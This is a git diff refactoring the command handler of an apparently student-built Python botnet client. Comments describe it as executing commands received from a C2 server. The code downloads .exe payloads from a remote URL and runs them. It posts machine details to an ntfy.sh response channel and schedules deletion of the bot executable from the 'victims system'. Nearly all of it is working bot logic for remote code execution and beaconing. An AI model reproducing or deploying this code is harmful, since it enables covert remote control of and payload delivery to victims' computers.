@@ -1,63 +1,43 @@
+# Import Libraries
 import os
 import sys
 import requests
-import platform
 import subprocess
-from bots.Command import Command
 
-RESPONSE_URL = "https://ntfy.sh/BNS_BN_22"
+# Import Classes
+from bots.Command import Command
+from bots.CommandConverter import CommandConverter
+
+from bots.MachineInfo import MachineInfo
+from bots.ExecutingProgramHandler import ExecutingProgramHandler
+from bots.NotificationBuilder import NotificationBuilder
+
+# Imprort Dictionaries
+from bots.dictionaries.NotficationEvents import Events
+from bots.dictionaries.CommunicationChannels import CommChannels
+
 
 # Handles the recieved commands from the C2 server and executes the corresponding actions on the bot's system
 class CommandHandler:
     def __init__(self, bot, crypt):
         self.bot = bot
         self.crypt = crypt
-        self.payloads = []
-        self.__init_os_info()
 
-    def __init_os_info(self):
-        # DEVICE ID
-        self.MAC_ADDR = "00:1A:2B:3C:4D:5E"  # Placeholder for MAC address retrieval logic
-        self.IP_ADDR = "192.168.1.100"  # Placeholder for IP address retrieval logic
-
-        # DEVICE INFO
-        self.ARCHITECTURE = platform.machine()
-        self.CPU_INFO = platform.processor()
-
-        # OS INFO
-        self.OS_NAME = platform.system()
-        self.OS_VERSION = platform.release()
-
-
-    def __get_os_info(self):
-        return f"MAC Address: {self.MAC_ADDR} \nIP Address: {self.IP_ADDR} \nOS: {self.OS_NAME} {self.OS_VERSION} \nArchitecture: {self.ARCHITECTURE} \nCPU: {self.CPU_INFO}"
-
-
-    # Convert the command string to the corresponding Command enum value, return Command.NONE if no match is found
-    def __convert_cmd_to_enum(self, cmd: str):
-        if cmd == Command.STATUS.value:
-            return Command.STATUS
-        elif cmd == Command.PAYLOAD.value:
-            return Command.PAYLOAD
-        elif cmd == Command.EXECUTE.value:
-            return Command.EXECUTE
-        elif cmd == Command.STOP.value:
-            return Command.STOP
-        elif cmd == Command.REMOVE.value:
-            return Command.REMOVE
-        else:
-            return Command.NONE
+        self.machineInfo = MachineInfo()
+        self.exeHandler = ExecutingProgramHandler()
+        self.notificationBuilder = NotificationBuilder()
+        self.cmdConverter = CommandConverter()
 
 
     # Download the payload from a specified URL and save it to the bot's system
     def __download_payload(self, id: str):
-        payloadURL = f"https://raw.githubusercontent.com/WannesDH-2261159/BNS_BN_22/main/{id}.exe"
+        payloadURL = CommChannels["DOWNLOAD_CHANNEL"] + f"/{id}.exe"
         outputFile = f"payloads/{id}.exe"
 
         # Ensure the payloads directory exists
         os.makedirs("payloads", exist_ok=True)
-
         print(f"Downloading payload... from URL: {payloadURL}")
+
         r = requests.get(payloadURL)
         if r.status_code == 200:
             with open(outputFile, "wb") as f:
@@ -71,37 +51,27 @@ class CommandHandler:
     def __executePayload(self, id: str):
         print("Executing Payload...")
         payload_name = f"payloads/{id}.exe"
-        self.payloads.append(subprocess.Popen(payload_name, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP))
+        self.exeHandler.add_program(subprocess.Popen(payload_name, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP))
         print("Payload executed successfully.")
 
 
     # Stop any running payloads
     def __stopPayload(self):
-        print("Stopping Payloads...")
-        for i in self.payloads:
-            try:
-                i.send_signal(1)  # Send CTRL_BREAK_EVENT to gracefully stop the process
-                i.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                i.kill()
-                i.wait()
-            except Exception as e:
-                print(f"Error stopping payload: {e}")
-
-        print("All Payloads stopped successfully.")
-        self.payloads = []
+        self.exeHandler.stop_all_programs()
 
 
     # Announce bot status to C2 server
     def __announce_status(self):
         print("Announcing status to C2 server...")
 
-        r = requests.post(RESPONSE_URL, data=self.__get_os_info().encode(encoding='utf-8'))
+        mInfo = self.machineInfo.get_machine_info()
+        ntfy = self.notificationBuilder.build_notification(mInfo, Events["START"])
+
+        r = requests.post(CommChannels["RESPONSE_CHANNEL"], data=ntfy.encode(encoding='utf-8'))
         if r.status_code == 200:
             print(f"Bot announced status successfully.")
         else:
             print(f"Bot failed to announce status.")
-
 
 
     # Remove all payload files from the bot's system
@@ -114,7 +84,7 @@ class CommandHandler:
         os.removedirs(path)
 
 
-
+    # Delete bot executable from victims system
     def __schedule_self_delete(self):
         exe_path = os.path.abspath(sys.argv[0])
         if os.name == "nt":  # Windows
@@ -141,7 +111,7 @@ class CommandHandler:
     # Handle commands received from C2 server
     def handle_command(self, cmd_tuple):
         cmd, id, params = cmd_tuple
-        cmd = self.__convert_cmd_to_enum(cmd)
+        cmd = self.cmdConverter.convert_cmd_to_enum(cmd)
 
         print(f"Handling command: {cmd}, id: {id}, params: {params}")
 
